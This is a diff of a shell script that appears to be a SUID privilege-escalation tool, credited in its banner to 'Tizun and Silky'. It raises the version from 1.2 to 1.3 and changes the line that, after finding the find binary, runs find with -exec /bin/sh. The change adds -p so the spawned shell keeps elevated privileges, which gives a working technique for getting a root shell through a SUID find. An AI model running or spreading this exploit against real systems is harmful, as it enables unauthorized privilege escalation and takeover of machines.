@@ -7,7 +7,7 @@ echo "███████╗██║   ██║██║██║  ██║
 echo "╚════██║██║   ██║██║██║  ██║╚════██║██╔═══╝ ██║     ██║   ██║██║   ██║   "
 echo "███████║╚██████╔╝██║██████╔╝███████║██║     ███████╗╚██████╔╝██║   ██║   "
 echo "╚══════╝ ╚═════╝ ╚═╝╚═════╝ ╚══════╝╚═╝     ╚══════╝ ╚═════╝ ╚═╝   ╚═╝   "
-echo "                               Version: 1.2     coded by Tizun and Silky"
+echo "                               Version: 1.3     coded by Tizun and Silky"
 
 
 
@@ -378,7 +378,7 @@ fi
  printf "============================================\n"
 printf "find found\n"
 printf "trying to get a shell:\n"
-y=$(which find); $y . -exec /bin/sh \; -quit  
+y=$(which find); $y . -exec /bin/sh -p \; -quit  
 printf "============================================\n" 
 fi
 
